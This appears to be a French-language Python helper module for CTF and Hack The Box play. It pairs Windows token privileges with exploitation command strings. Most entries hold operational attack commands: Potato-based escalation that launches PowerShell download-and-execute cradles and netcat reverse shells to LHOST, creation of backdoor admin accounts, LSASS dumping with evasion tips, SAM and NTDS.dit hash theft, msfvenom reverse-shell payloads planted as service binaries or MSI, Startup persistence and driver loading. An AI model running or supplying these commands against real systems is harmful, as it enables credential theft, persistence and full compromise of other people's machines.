"""
ChocoScan — Windows Token Privilege Helper.

Pour chaque privilège Windows dangereux : commande de vérification,
technique d'exploitation et outils recommandés.

Très fréquent en CTF HTB (boxes Windows, labs Active Directory) :
dès qu'on obtient un shell en tant que service account, IIS, mssql,
network service, etc., ces comptes ont souvent SeImpersonatePrivilege.

Workflow typique :
  1. Shell Windows obtenu (web RCE, SQLi xp_cmdshell, exploit CVE...)
  2. whoami /priv  →  copier la sortie
  3. python3 chocoscan.py --tokens 'SE_PRIV1,SE_PRIV2,...'
  4. Exploit ciblé en 30 secondes

Privilèges couverts :
  SeImpersonatePrivilege       → Potato attacks (GodPotato, PrintSpoofer...)
  SeAssignPrimaryTokenPrivilege → Potato attacks (même impact)
  SeDebugPrivilege             → LSASS dump → hashes → PTH
  SeTakeOwnershipPrivilege     → Prendre propriété SAM/services
  SeBackupPrivilege            → Lire SAM/SYSTEM/NTDS.dit
  SeRestorePrivilege           → Écrire partout (service binaries)
  SeLoadDriverPrivilege        → Charger un driver vulnérable (BYOVD)
  SeCreateTokenPrivilege       → Créer un token arbitraire
  SeTcbPrivilege               → Agir comme partie de l'OS
  SeManageVolumePrivilege      → Accès direct disque
  AlwaysInstallElevated        → MSI install en SYSTEM
  Token impersonation          → Incognito / Invoke-TokenManipulation

Référence : book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens
Développé par Kinder-Bueno (Mathys CASTELLA)
"""

from __future__ import annotations

from dataclasses import dataclass, field


# ── Modèle ────────────────────────────────────────────────────────────────────

@dataclass
class TokenCheck:
    title:      str
    category:   str    # potato | debug | ownership | backup | driver | misc
    privilege:  str    # Nom exact du privilège Windows (ex: SeImpersonatePrivilege)
    description: str
    check_cmd:  str    # Commande pour confirmer le privilège
    exploit_cmd: str   # Commande d'exploitation
    severity:   str = "high"   # critical | high | medium | low
    difficulty: str = "easy"   # easy | medium | hard
    notes:      list[str] = field(default_factory=list)


# ── Potato Attacks — SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege ───
#
# Le scénario le plus fréquent en CTF :
# IIS, MSSQL, sqlservr, LocalService, NetworkService ont ce privilège.
# Un token de service peut usurper l'identité de SYSTEM.

POTATO_CHECKS: list[TokenCheck] = [

    TokenCheck(
        title="GodPotato — Windows 10/11/Server 2012-2022 (le plus universel)",
        category="potato",
        privilege="SeImpersonatePrivilege",
        description=(
            "GodPotato abuse DCOM/RPC pour forcer le processus SYSTEM "
            "à se connecter à notre Named Pipe, puis impersonate le token obtenu. "
            "Fonctionne sur TOUTES les versions Windows depuis Server 2012 "
            "— même quand JuicyPotato et PrintSpoofer échouent."
        ),
        check_cmd=(
            "whoami /priv | findstr /i SeImpersonatePrivilege\n"
            "# → 'Enabled' = vulnérable\n"
            "# Vérifier l'OS :\n"
            "systeminfo | findstr /i 'OS Name\\|OS Version'"
        ),
        exploit_cmd=(
            "# Télécharger : https://github.com/BeichenDream/GodPotato/releases\n\n"
            "# Vérifier l'impersonnalisation :\n"
            "GodPotato.exe -cmd \"whoami\"\n\n"
            "# Reverse shell PowerShell :\n"
            "GodPotato.exe -cmd \"powershell -nop -c \\\"IEX(New-Object Net.WebClient)"
            ".DownloadString('http://LHOST/shell.ps1')\\\"\"\n\n"
            "# Ajouter un admin local :\n"
            "GodPotato.exe -cmd \"net user hacker P@ssw0rd123 /add\"\n"
            "GodPotato.exe -cmd \"net localgroup administrators hacker /add\"\n\n"
            "# Reverse shell netcat (si nc.exe uploadé) :\n"
            "GodPotato.exe -cmd \"C:\\\\Windows\\\\Temp\\\\nc.exe LHOST LPORT -e cmd.exe\"\n\n"
            "# Upload GodPotato depuis Kali :\n"
            "# curl http://LHOST/GodPotato.exe -o C:\\Windows\\Temp\\gp.exe"
        ),
        severity="critical",
        difficulty="easy",
        notes=[
            "Utiliser la version correspondant à l'arch cible : GodPotato-NET2/NET35/NET4",
            "Listener : nc -lvnp LPORT  ou  msfconsole multi/handler",
            "Télécharger : https://github.com/BeichenDream/GodPotato",
        ],
    ),

    TokenCheck(
        title="PrintSpoofer — Win10/Server 2016/2019 (Print Spooler requis)",
        category="potato",
        privilege="SeImpersonatePrivilege",
        description=(
            "Abuse le Print Spooler (spoolsv.exe) via une Named Pipe pour "
            "forcer SYSTEM à s'authentifier, puis vole le token. "
            "Fonctionne si Print Spooler est actif (souvent le cas par défaut)."
        ),
        check_cmd=(
            "whoami /priv | findstr /i SeImpersonatePrivilege\n"
            "# Vérifier que Print Spooler tourne :\n"
            "sc query Spooler | findstr /i running"
        ),
        exploit_cmd=(
            "# Télécharger : https://github.com/itm4n/PrintSpoofer/releases\n\n"
            "# Shell interactif SYSTEM :\n"
            "PrintSpoofer64.exe -i -c cmd.exe\n\n"
            "# Reverse shell :\n"
            "PrintSpoofer64.exe -c \"C:\\\\Windows\\\\Temp\\\\nc.exe LHOST LPORT -e cmd.exe\"\n\n"
            "# PowerShell reverse shell :\n"
            "PrintSpoofer64.exe -c \"powershell -nop -c \\\"IEX(IWR -UseBasicParsing "
            "http://LHOST/shell.ps1)\\\"\""
        ),
        severity="critical",
        difficulty="easy",
        notes=[
            "PrintSpoofer32.exe pour les processus 32 bits",
            "Si Print Spooler est arrêté → utiliser GodPotato à la place",
        ],
    ),

    TokenCheck(
        title="RoguePotato — Server 2019+ (quand PrintSpoofer échoue)",
        category="potato",
        privilege="SeImpersonatePrivilege",
        description=(
            "Alternative à JuicyPotato pour Windows Server 2019+. "
            "Nécessite un port forwarding depuis la Kali (socat ou chisel) "
            "car il utilise un port réseau pour le Named Pipe."
        ),
        check_cmd="whoami /priv | findstr /i SeImpersonatePrivilege",
        exploit_cmd=(
            "# Télécharger : https://github.com/antonioCoco/RoguePotato\n\n"
            "# 1. Sur Kali — forwarder le port 135 vers la cible :\n"
            "socat tcp-listen:135,reuseaddr,fork tcp:TARGET_IP:9999 &\n\n"
            "# 2. Sur la cible :\n"
            "RoguePotato.exe -r LHOST -e \"cmd.exe\" -l 9999\n\n"
            "# Reverse shell direct :\n"
            "RoguePotato.exe -r LHOST -c \"{clsid}\" "
            "-e \"powershell -nop -c IEX(IWR http://LHOST/shell.ps1)\""
        ),
        severity="critical",
        difficulty="medium",
        notes=["CLSIDs : https://github.com/antonioCoco/RoguePotato/blob/master/README.md"],
    ),

    TokenCheck(
        title="JuicyPotato — Windows 7 → Server 2019 (avant patch mars 2019)",
        category="potato",
        privilege="SeImpersonatePrivilege",
        description=(
            "L'original. Abuse DCOM avec un CLSID de service SYSTEM. "
            "Ne fonctionne plus sur Server 2019+ patché → utiliser GodPotato."
        ),
        check_cmd=(
            "whoami /priv | findstr /i SeImpersonatePrivilege\n"
            "systeminfo | findstr /i 'OS Version'"
        ),
        exploit_cmd=(
            "# Télécharger : https://github.com/ohpe/juicy-potato/releases\n\n"
            "# CLSID pour BITS (presque universel) :\n"
            "JuicyPotato.exe -l 1337 -p C:\\Windows\\System32\\cmd.exe "
            "-a '/c net user hacker P@ssw0rd /add && net localgroup administrators hacker /add' "
            "-t * -c {4991d34b-80a1-4291-83b6-3328366b9097}\n\n"
            "# Reverse shell :\n"
            "JuicyPotato.exe -l 1337 "
            "-p C:\\Windows\\Temp\\nc.exe "
            "-a 'LHOST LPORT -e cmd.exe' "
            "-t * -c {4991d34b-80a1-4291-83b6-3328366b9097}\n\n"
            "# Si CLSID BITS ne marche pas → chercher dans la liste :\n"
            "# https://github.com/ohpe/juicy-potato/tree/master/CLSID"
        ),
        severity="critical",
        difficulty="easy",
        notes=[
            "Ne fonctionne PAS sur Windows Server 2019+ patché → utiliser GodPotato",
            "Liste de CLSIDs par OS : https://github.com/ohpe/juicy-potato/tree/master/CLSID",
        ],
    ),

    TokenCheck(
        title="SweetPotato — combinaison de techniques Potato",
        category="potato",
        privilege="SeImpersonatePrivilege",
        description=(
            "Outil tout-en-un qui essaie plusieurs techniques Potato "
            "(EfsRpc, PrintSpoofer, StorSvc) automatiquement."
        ),
        check_cmd="whoami /priv | findstr /i SeImpersonatePrivilege",
        exploit_cmd=(
            "# Télécharger : https://github.com/CCob/SweetPotato\n\n"
            "SweetPotato.exe -a \"net user hacker P@ssw0rd /add\"\n"
            "SweetPotato.exe -p C:\\Windows\\Temp\\nc.exe -a \"LHOST LPORT -e cmd.exe\"\n\n"
            "# Avec méthode spécifique :\n"
            "SweetPotato.exe -e EfsRpc -a \"whoami\"\n"
            "SweetPotato.exe -e PrintSpoofer -a \"whoami\""
        ),
        severity="critical",
        difficulty="easy",
        notes=["Bon choix quand on ne sait pas quelle version Windows cible"],
    ),

    TokenCheck(
        title="SeAssignPrimaryTokenPrivilege — même impact que SeImpersonate",
        category="potato",
        privilege="SeAssignPrimaryTokenPrivilege",
        description=(
            "Permet d'assigner un token primaire à un nouveau processus. "
            "Équivalent fonctionnel de SeImpersonatePrivilege — "
            "toutes les techniques Potato s'appliquent."
        ),
        check_cmd="whoami /priv | findstr /i SeAssignPrimaryTokenPrivilege",
        exploit_cmd=(
            "# Mêmes techniques que SeImpersonatePrivilege :\n"
            "# GodPotato, PrintSpoofer, RoguePotato, JuicyPotato\n\n"
            "GodPotato.exe -cmd \"whoami\"\n"
            "PrintSpoofer64.exe -i -c cmd.exe"
        ),
        severity="critical",
        difficulty="easy",
    ),
]


# ── SeDebugPrivilege — LSASS dump ─────────────────────────────────────────────

DEBUG_CHECKS: list[TokenCheck] = [

    TokenCheck(
        title="SeDebugPrivilege — dump LSASS (hashes en clair)",
        category="debug",
        privilege="SeDebugPrivilege",
        description=(
            "Permet d'attacher un débogueur à n'importe quel processus, "
            "y compris LSASS. Dump LSASS → hashes NTLM → Pass-the-Hash "
            "ou cracking → admin domaine possible."
        ),
        check_cmd=(
            "whoami /priv | findstr /i SeDebugPrivilege\n"
            "# Trouver le PID de LSASS :\n"
            "tasklist | findstr /i lsass"
        ),
        exploit_cmd=(
            "# ── Méthode 1 : ProcDump (Microsoft signé — bypasse AV) ─────────\n"
            "# Uploader procdump64.exe depuis Kali\n"
            "procdump64.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass.dmp\n\n"
            "# ── Méthode 2 : comsvcs.dll (natif Windows — sans outils) ───────\n"
            "# Récupérer le PID de lsass :\n"
            "Get-Process lsass | Select-Object Id\n"
            "# Ou :\n"
            "tasklist /fi \"imagename eq lsass.exe\"\n"
            "# Dump :\n"
            "rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump PID_LSASS "
            "C:\\Windows\\Temp\\lsass.dmp full\n\n"
            "# ── Méthode 3 : Task Manager (si accès GUI) ──────────────────────\n"
            "# Task Manager → Details → lsass.exe → clic droit → 'Create dump file'\n\n"
            "# ── Méthode 4 : mimikatz (si AV contourné) ──────────────────────\n"
            "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit\n\n"
            "# ── Exfil et analyse depuis Kali ─────────────────────────────────\n"
            "# Récupérer le dump (SMB, HTTP, base64...)\n"
            "impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL\n"
            "# Ou avec pypykatz :\n"
            "pypykatz lsa minidump lsass.dmp"
        ),
        severity="critical",
        difficulty="easy",
        notes=[
            "Defender détecte mimikatz — préférer procdump ou comsvcs.dll",
            "Obfusquer le dump : rename lsass.exe en lsass.dmp.log avant transfert",
            "pypykatz : pip install pypykatz",
        ],
    ),

    TokenCheck(
        title="SeDebugPrivilege — injection dans un processus SYSTEM",
        category="debug",
        privilege="SeDebugPrivilege",
        description=(
            "Avec SeDebugPrivilege, on peut injecter du code dans un processus SYSTEM "
            "(winlogon, svchost, lsass) et exécuter du shellcode en son nom."
        ),
        check_cmd="whoami /priv | findstr /i SeDebugPrivilege",
        exploit_cmd=(
            "# ── Via Metasploit (migrate) ────────────────────────────────────\n"
            "# Dans un shell meterpreter :\n"
            "meterpreter> ps | grep winlogon\n"
            "meterpreter> migrate PID_WINLOGON\n\n"
            "# ── Via PowerShell + Invoke-ReflectivePEInjection ───────────────\n"
            "# https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1\n\n"
            "# ── Via CreateRemoteThread (C) ───────────────────────────────────\n"
            "# Trouver le PID d'un processus SYSTEM :\n"
            "Get-Process -IncludeUserName | Where-Object {$_.UserName -match 'SYSTEM'}"
        ),
        severity="high",
        difficulty="hard",
    ),
]


# ── SeTakeOwnershipPrivilege ──────────────────────────────────────────────────

OWNERSHIP_CHECKS: list[TokenCheck] = [

    TokenCheck(
        title="SeTakeOwnershipPrivilege — prendre propriété de fichiers protégés",
        category="ownership",
        privilege="SeTakeOwnershipPrivilege",
        description=(
            "Permet de prendre la propriété de n'importe quel fichier/clé de registre "
            "sans être son propriétaire actuel. "
            "→ Modifier des exécutables de services, lire SAM/SYSTEM, remplacer Utilman."
        ),
        check_cmd=(
            "whoami /priv | findstr /i SeTakeOwnershipPrivilege\n"
            "# Lister les services vulnérables (binpath writable une fois propriétaire) :\n"
            "wmic service get name,pathname,startmode | findstr /i auto | findstr /v system32"
        ),
        exploit_cmd=(
            "# ── Scénario 1 : récupérer les ruches SAM/SYSTEM ─────────────────\n"
            "# Prendre la propriété de SAM :\n"
            "takeown /f C:\\Windows\\System32\\config\\SAM /A\n"
            "icacls C:\\Windows\\System32\\config\\SAM /grant Administrators:F\n"
            "# Copier et exfiltrer :\n"
            "copy C:\\Windows\\System32\\config\\SAM C:\\Windows\\Temp\\SAM\n"
            "copy C:\\Windows\\System32\\config\\SYSTEM C:\\Windows\\Temp\\SYSTEM\n"
            "# Depuis Kali :\n"
            "impacket-secretsdump -sam SAM -system SYSTEM LOCAL\n\n"
            "# ── Scénario 2 : remplacer Utilman (bypass lockscreen) ───────────\n"
            "# Sur Server 2008-2012 (écran de connexion) :\n"
            "takeown /f C:\\Windows\\System32\\Utilman.exe\n"
            "icacls C:\\Windows\\System32\\Utilman.exe /grant Administrators:F\n"
            "copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\Utilman.exe\n"
            "# → Appuyer sur Win+U à l'écran de verrouillage → cmd SYSTEM\n\n"
            "# ── Scénario 3 : modifier le binaire d'un service ────────────────\n"
            "# Trouver un service qui tourne en SYSTEM avec un binaire non-system32 :\n"
            "wmic service get name,pathname,startmode | findstr /i auto\n"
            "# Prendre la propriété :\n"
            "takeown /f \"C:\\Program Files\\Service\\vulnerable.exe\"\n"
            "icacls \"C:\\Program Files\\Service\\vulnerable.exe\" /grant Users:F\n"
            "# Remplacer par un reverse shell :\n"
            "msfvenom -p windows/x64/shell_reverse_tcp LHOST=LHOST LPORT=LPORT "
            "-f exe -o vulnerable.exe\n"
            "copy vulnerable.exe \"C:\\Program Files\\Service\\vulnerable.exe\"\n"
            "sc stop VulnService && sc start VulnService"
        ),
        severity="critical",
        difficulty="medium",
        notes=["EnableAllPrivileges() requis dans certains contextes PowerShell"],
    ),
]


# ── SeBackupPrivilege / SeRestorePrivilege ────────────────────────────────────

BACKUP_CHECKS: list[TokenCheck] = [

    TokenCheck(
        title="SeBackupPrivilege — lire SAM/SYSTEM/NTDS.dit (bypass DACL)",
        category="backup",
        privilege="SeBackupPrivilege",
        description=(
            "Permet d'ouvrir n'importe quel fichier en lecture, "
            "en ignorant les ACL (ACCESS_SYSTEM_SECURITY). "
            "→ Copier les ruches de registre SAM/SYSTEM → hashes locaux. "
            "→ Sur DC : copier NTDS.dit → hashes de TOUT le domaine."
        ),
        check_cmd=(
            "whoami /priv | findstr /i SeBackupPrivilege\n"
            "# Note : peut être listé mais désactivé — enabler avec PowerShell"
        ),
        exploit_cmd=(
            "# ── Activer le privilège si désactivé ───────────────────────────\n"
            "# Avec PowerShell (WinAPI) :\n"
            "$priv = [System.Security.Principal.WindowsPrincipal]"
            "[System.Security.Principal.WindowsIdentity]::GetCurrent()\n\n"
            "# ── Via reg save (pas besoin d'activer explicitement) ────────────\n"
            "reg save HKLM\\SAM C:\\Windows\\Temp\\SAM\n"
            "reg save HKLM\\SYSTEM C:\\Windows\\Temp\\SYSTEM\n"
            "reg save HKLM\\SECURITY C:\\Windows\\Temp\\SECURITY\n\n"
            "# Transférer et dumper depuis Kali :\n"
            "impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL\n\n"
            "# ── Sur un DC : copier NTDS.dit ──────────────────────────────────\n"
            "# Volume Shadow Copy (VSS) :\n"
            "vssadmin create shadow /for=C:\n"
            "# Récupérer le path créé depuis la sortie, ex: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\n"
            "copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\ntds.dit "
            "C:\\Windows\\Temp\\ntds.dit\n"
            "# Depuis Kali :\n"
            "impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL"
        ),
        severity="critical",
        difficulty="medium",
        notes=[
            "Peut nécessiter d'activer explicitement le privilège avec "
            "Invoke-TokenManipulation ou EnablePrivilege",
            "ntds.dit + SYSTEM → tous les hashes du domaine",
        ],
    ),

    TokenCheck(
        title="SeRestorePrivilege — écrire partout (bypass DACL)",
        category="backup",
        privilege="SeRestorePrivilege",
        description=(
            "Permet d'écrire dans n'importe quel fichier en ignorant les ACL. "
            "→ Remplacer des binaires de services SYSTEM, écrire dans Startup, "
            "modifier des clés de registre protégées."
        ),
        check_cmd="whoami /priv | findstr /i SeRestorePrivilege",
        exploit_cmd=(
            "# ── Remplacer un service binaire ─────────────────────────────────\n"
            "# Générer le payload :\n"
            "msfvenom -p windows/x64/shell_reverse_tcp LHOST=LHOST LPORT=LPORT "
            "-f exe -o evil.exe\n\n"
            "# Écrire dans un chemin protégé (avec le privilège) :\n"
            "# (en C/PowerShell via CreateFile avec BACKUP_SEMANTICS)\n\n"
            "# ── Modifier une clé de registre ─────────────────────────────────\n"
            "# HKLM\\System\\CurrentControlSet\\Services\\<service>\\ImagePath :\n"
            "reg add HKLM\\System\\CurrentControlSet\\Services\\VulnSvc "
            "/v ImagePath /t REG_EXPAND_SZ /d C:\\Windows\\Temp\\evil.exe /f\n"
            "sc start VulnSvc\n\n"
            "# ── Persistance via Startup ──────────────────────────────────────\n"
            "copy evil.exe \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\""
        ),
        severity="high",
        difficulty="medium",
    ),
]


# ── SeLoadDriverPrivilege — BYOVD ─────────────────────────────────────────────

DRIVER_CHECKS: list[TokenCheck] = [

    TokenCheck(
        title="SeLoadDriverPrivilege — Bring Your Own Vulnerable Driver (BYOVD)",
        category="driver",
        privilege="SeLoadDriverPrivilege",
        description=(
            "Permet de charger un driver kernel. Si les drivers non signés sont "
            "acceptés (SecureBoot désactivé ou driver signé), on peut charger "
            "un driver vulnérable (Capcom.sys, eolink.sys, etc.) et exécuter "
            "du code ring-0 → SYSTEM."
        ),
        check_cmd=(
            "whoami /priv | findstr /i SeLoadDriverPrivilege\n"
            "# Vérifier SecureBoot :\n"
            "Confirm-SecureBootUEFI 2>$null\n"
            "# Vérifier si les drivers non signés sont acceptés :\n"
            "bcdedit /enum | findstr /i testsigning"
        ),
        exploit_cmd=(
            "# ── Capcom.sys (ancien — CVE-2016-7255) ──────────────────────────\n"
            "# PoC : https://github.com/tandasat/ExploitCapcom\n"
            "ExploitCapcom.exe\n\n"
            "# ── Outil automatisé : EoPLoadDriver ─────────────────────────────\n"
            "# https://github.com/TarlogicSecurity/EoPLoadDriver\n"
            "EoPLoadDriver.exe System\\CurrentControlSet\\MyService C:\\Capcom.sys\n\n"
            "# ── Approche moderne (outil tarlogic) ────────────────────────────\n"
            "# https://www.tarlogic.com/blog/seloaddriverprivilege-privilege-escalation/\n\n"
            "# Étapes génériques :\n"
            "# 1. Choisir un driver vulnérable signé (eolink.sys, DBUtil_2_3.sys...)\n"
            "# 2. Créer la clé de registre service :\n"
            "sc create VulnDrv type= kernel binpath= C:\\Windows\\Temp\\vuln.sys\n"
            "# 3. Charger le driver :\n"
            "sc start VulnDrv\n"
            "# 4. Exploiter la vulnérabilité du driver pour exécuter code ring-0"
        ),
        severity="high",
        difficulty="hard",
        notes=[
            "Databases de drivers vulnérables : https://loldrivers.io/",
            "Plus facile en CTF sur des boxes anciennes",
        ],
    ),
]


# ── Autres privilèges ─────────────────────────────────────────────────────────

MISC_CHECKS: list[TokenCheck] = [

    TokenCheck(
        title="AlwaysInstallElevated — MSI install en SYSTEM",
        category="misc",
        privilege="AlwaysInstallElevated",
        description=(
            "Si les deux clés de registre AlwaysInstallElevated sont à 1 "
            "(HKCU et HKLM), tout MSI s'installe avec les droits SYSTEM. "
            "Très fréquent sur les anciennes boxes HTB Windows."
        ),
        check_cmd=(
            "# Vérifier les deux clés (les deux doivent être à 1) :\n"
            "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n"
            "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"
        ),
        exploit_cmd=(
            "# Générer un MSI malicieux avec msfvenom :\n"
            "msfvenom -p windows/x64/shell_reverse_tcp LHOST=LHOST LPORT=LPORT "
            "-f msi -o evil.msi\n\n"
            "# Uploader sur la cible, puis exécuter :\n"
            "msiexec /quiet /qn /i C:\\Windows\\Temp\\evil.msi\n\n"
            "# Listener Kali :\n"
            "nc -lvnp LPORT\n\n"
            "# Ajouter un admin directement :\n"
            "msfvenom -p windows/adduser USER=hacker PASS=P@ssw0rd "
            "-f msi -o adduser.msi\n"
            "msiexec /quiet /qn /i C:\\Windows\\Temp\\adduser.msi"
        ),
        severity="critical",
        difficulty="easy",
        notes=["winPEAS détecte aussi AlwaysInstallElevated automatiquement"],
    ),

    TokenCheck(
        title="Token Impersonation — Incognito (meterpreter)",
        category="misc",
        privilege="SeImpersonatePrivilege",
        description=(
            "Incognito liste tous les tokens délégués disponibles sur le système. "
            "Permet d'usurper l'identité d'un utilisateur connecté "
            "(admin domaine, SYSTEM, autre utilisateur) sans connaître son mot de passe."
        ),
        check_cmd=(
            "# Dans une session meterpreter :\n"
            "meterpreter> use incognito\n"
            "meterpreter> list_tokens -u\n"
            "# En dehors de meterpreter :\n"
            "# Uploader incognito.exe\n"
            "# https://github.com/FSecureLABS/incognito"
        ),
        exploit_cmd=(
            "# Via meterpreter :\n"
            "meterpreter> use incognito\n"
            "meterpreter> list_tokens -u\n"
            "meterpreter> impersonate_token 'DOMAIN\\\\Administrator'\n"
            "meterpreter> getuid  # → DOMAIN\\Administrator\n"
            "meterpreter> shell\n\n"
            "# Via incognito.exe standalone :\n"
            "incognito.exe execute -c \"DOMAIN\\\\Administrator\" cmd.exe\n\n"
            "# Via PowerShell (Invoke-TokenManipulation) :\n"
            "Import-Module .\\Invoke-TokenManipulation.ps1\n"
            "Invoke-TokenManipulation -ImpersonateUser -Username 'DOMAIN\\\\Administrator'"
        ),
        severity="critical",
        difficulty="easy",
        notes=[
            "Tokens disponibles = utilisateurs connectés ou ayant eu une session ouverte",
            "Invoke-TokenManipulation : https://github.com/PowerShellMafia/PowerSploit",
        ],
    ),

    TokenCheck(
        title="SeCreateTokenPrivilege — créer un token arbitraire",
        category="misc",
        privilege="SeCreateTokenPrivilege",
        description=(
            "Privilège très rare permettant de créer un token avec n'importe quel "
            "groupe et privilège. Équivaut à une élévation directe vers SYSTEM ou admin."
        ),
        check_cmd="whoami /priv | findstr /i SeCreateTokenPrivilege",
        exploit_cmd=(
            "# Très peu de PoC publics — nécessite du code C/C++ natif\n"
            "# Référence : https://book.hacktricks.xyz/windows-hardening/"
            "windows-local-privilege-escalation/privilege-escalation-abusing-tokens"
            "#secreatetokenprivilege\n\n"
            "# En pratique : privilège souvent couplé à d'autres → utiliser les autres"
        ),
        severity="critical",
        difficulty="hard",
        notes=["Rare en CTF — souvent signe d'un vecteur plus simple à côté"],
    ),

    TokenCheck(
        title="Tous les privilèges — winPEAS / PrivescCheck (automatisation)",
        category="misc",
        privilege="*",
        description=(
            "Outils d'automatisation de l'analyse des privilèges Windows. "
            "À lancer dès qu'on obtient un shell pour ne rien manquer."
        ),
        check_cmd=(
            "# Télécharger et exécuter winPEAS :\n"
            "# https://github.com/carlospolop/PEASS-ng/releases\n"
            "winPEASany.exe quiet | Out-File C:\\Windows\\Temp\\peas.txt\n\n"
            "# PrivescCheck (PowerShell, moins détecté) :\n"
            "# https://github.com/itm4n/PrivescCheck\n"
            "IEX (New-Object Net.WebClient).DownloadString('http://LHOST/PrivescCheck.ps1')\n"
            "Invoke-PrivescCheck -Extended | Out-File C:\\Windows\\Temp\\privesc.txt"
        ),
        exploit_cmd="# Analyser les résultats et appliquer les exploits correspondants",
        severity="high",
        difficulty="easy",
        notes=[
            "winPEAS couvre aussi AlwaysInstallElevated, services, registry autorun...",
            "PrivescCheck : moins de faux positifs, plus lisible, moins détecté",
        ],
    ),
]


# ── Toutes les vérifications ──────────────────────────────────────────────────

ALL_TOKEN_CHECKS: list[TokenCheck] = (
    POTATO_CHECKS +
    DEBUG_CHECKS +
    OWNERSHIP_CHECKS +
    BACKUP_CHECKS +
    DRIVER_CHECKS +
    MISC_CHECKS
)


# ── Parsing de whoami /priv ───────────────────────────────────────────────────

def analyze_whoami_priv(output: str) -> list[TokenCheck]:
    """
    Parse la sortie de 'whoami /priv' et retourne les checks
    correspondant aux privilèges activés.

    Args:
        output: Sortie brute de 'whoami /priv' (collée en argument CLI).

    Returns:
        Liste de TokenCheck filtrée sur les privilèges détectés,
        ou la liste complète si parsing impossible.
    """
    if not output.strip():
        return ALL_TOKEN_CHECKS

    enabled: set[str] = set()

    for line in output.splitlines():
        stripped = line.strip()
        if not stripped or not stripped.startswith("Se"):
            continue
        parts = stripped.split()
        if not parts:
            continue
        priv_name = parts[0]
        # Rechercher "Enabled" ou "Activé" (Windows FR) dans la ligne
        if any(kw in line for kw in ("Enabled", "Activé", "Activée", "Activees")):
            enabled.add(priv_name)

    if not enabled:
        # Impossible de parser → tout retourner
        return ALL_TOKEN_CHECKS

    # Filtrer les checks correspondants
    relevant = [c for c in ALL_TOKEN_CHECKS if c.privilege in enabled or c.privilege == "*"]

    # Toujours inclure winPEAS
    winpeas = [c for c in MISC_CHECKS if c.privilege == "*"]
    for w in winpeas:
        if w not in relevant:
            relevant.append(w)

    return relevant if relevant else ALL_TOKEN_CHECKS


# ── Points d'entrée ───────────────────────────────────────────────────────────

def get_token_checks() -> list[TokenCheck]:
    """Retourne la checklist complète des token privilege checks."""
    return ALL_TOKEN_CHECKS


def get_checks_for_privilege(privilege: str) -> list[TokenCheck]:
    """Retourne les checks pour un privilège spécifique."""
    return [c for c in ALL_TOKEN_CHECKS
            if c.privilege.lower() == privilege.lower() or c.privilege == "*"]
